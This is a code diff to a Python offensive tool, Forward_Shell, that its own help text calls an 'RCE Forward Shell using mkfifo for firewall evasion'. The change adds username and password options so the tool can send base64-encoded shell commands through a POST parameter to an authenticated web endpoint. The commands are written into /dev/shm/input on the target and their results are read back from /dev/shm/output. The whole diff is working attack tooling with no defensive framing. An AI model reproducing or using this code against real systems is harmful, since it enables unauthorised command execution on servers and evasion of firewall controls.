@@ -5,8 +5,10 @@ import threading
 import time
 
 class Forward_Shell:
-    def __init__(self,target):
+    def __init__(self,target,username,password):
         self.url = target
+        self.username = username
+        self.password = password
         self.input = "/dev/shm/input"
         self.output = "/dev/shm/output"
         self.remove_files()
@@ -42,7 +44,10 @@ class Forward_Shell:
         }  
 
         try:
-            req_site = requests.post(self.url, data=payload, verify=False,timeout=1)
+            if args.u and args.p:
+                req_site = requests.post(self.url, data=payload,auth=(self.username,self.password), verify=False,timeout=1)
+            else:
+                req_site = requests.post(self.url, data=payload, verify=False,timeout=1)    
             return req_site.text.strip()
         except:
             pass
@@ -70,7 +75,10 @@ class Forward_Shell:
                     "rse":"echo " + rce_encoded + " | base64 -d > " + self.input #Change URL parameter here
                 }
 
-                requests.post(self.url, data=payload, verify=False)
+                if args.u and args.p:
+                    requests.post(self.url, data=payload, auth=(self.username,self.password),verify=False)
+                else:
+                    requests.post(self.url, data=payload,verify=False)
                 time.sleep(2.5)
 
             except KeyboardInterrupt:
@@ -82,6 +90,8 @@ class Forward_Shell:
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='RCE Forward Shell using mkfifo for firewall evasion')
     parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://rcefile.location/example.php?', required=True)
+    parser.add_argument('-u', metavar='<Username>', help='If target destination requires authentication. E.G: -u username', required=False)
+    parser.add_argument('-p', metavar='<Password>', help='If target destination requires authentication. E.G: -p password', required=False)
     args = parser.parse_args()
     
-    Forward_Shell(args.t)
+    Forward_Shell(args.t,args.u,args.p)
